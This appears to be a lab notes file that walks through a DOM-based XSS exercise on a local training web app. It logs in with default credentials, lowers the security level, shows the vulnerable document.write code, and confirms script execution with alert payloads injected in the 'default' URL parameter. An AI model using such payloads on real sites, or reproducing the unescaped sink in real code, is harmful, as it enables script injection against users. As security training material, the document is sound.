# Commands — XSS (DOM) Lab

## 1. Authenticate and establish session

```bash
curl -c cookies.txt -s http://localhost:4280/login.php -o login.html
TOKEN=$(grep -oP "user_token' value='\K[^']+" login.html)

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/login.php \
  -d "username=admin&password=password&Login=Login&user_token=$TOKEN" \
  -o login_result.html

curl -b cookies.txt -c cookies.txt -s http://localhost:4280/security.php \
  -d "security=low&seclev_submit=Submit" -o security_result.html
```

## 2. Inspect the baseline page and its client-side JavaScript

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/xss_d/" -o xss_dom_baseline.html
grep -A15 "vulnerable_code_area" xss_dom_baseline.html
```

**Relevant JavaScript found in the page source:**
```javascript
<select name="default">
  <script>
    if (document.location.href.indexOf("default=") >= 0) {
      var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
      document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
      document.write("<option value='' disabled='disabled'>----</option>");
    }
    document.write("<option value='English'>English</option>");
    document.write("<option value='French'>French</option>");
    document.write("<option value='Spanish'>Spanish</option>");
    document.write("<option value='German'>German</option>");
  </script>
</select>
```

## 3. Confirm the injection point via curl (server-side view)

```bash
curl -b cookies.txt -s "http://localhost:4280/vulnerabilities/xss_d/?default=<script>alert('XSS')</script>" \
  -o xss_dom_payload.html
grep -A5 "select" xss_dom_payload.html
```

**Result:** The raw HTML/JS returned by the server is byte-for-byte identical regardless of the `default=` value — confirming the server never processes or reflects this parameter at all. This is the defining characteristic of DOM-based XSS: the injection happens entirely client-side, so curl (which doesn't execute JavaScript) cannot demonstrate the exploit on its own.

## 4. Trigger the exploit in a real browser

Navigated directly to:
```
http://localhost:4280/vulnerabilities/xss_d/?default=<script>alert(document.domain)</script>
```

The browser's JavaScript engine executed the vulnerable client-side code:
1. `document.location.href` was read, containing the full URL including the injected `<script>` tag
2. The substring after `default=` was extracted (the raw, unescaped payload)
3. `document.write()` wrote this directly into the DOM
4. The browser parsed the newly-written `<script>` tag and executed it
5. `alert(document.domain)` fired, displaying `localhost` in a native browser alert box

**Result:** Confirmed arbitrary JavaScript execution — see `screenshots/02-dom-xss-popup.png`.
